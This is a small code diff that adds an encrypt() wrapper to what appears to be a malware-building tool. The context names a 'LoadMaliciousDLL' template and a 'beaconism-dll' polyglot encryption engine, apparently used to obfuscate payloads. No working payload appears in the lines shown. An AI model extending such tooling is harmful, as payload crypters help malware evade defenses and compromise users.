@@ -932,6 +932,23 @@ void LoadMaliciousDLL()
 }`;
     }
 
+    // Main encrypt method for compatibility
+    async encrypt(data, options = {}) {
+        try {
+            const algorithm = options.algorithm || 'aes-256-gcm';
+            const result = await this.applyEncryptionPolyglot(data, algorithm);
+            return {
+                success: true,
+                engine: 'beaconism-dll',
+                encrypted: result,
+                algorithm: algorithm
+            };
+        } catch (error) {
+            logger.error('Beaconism DLL encryption failed:', error);
+            throw error;
+        }
+    }
+
     async applyEncryptionPolyglot(code, encryptionMethod) {
         const encryptionConfig = this.encryptionKeys.get(encryptionMethod);
         if (!encryptionConfig) {
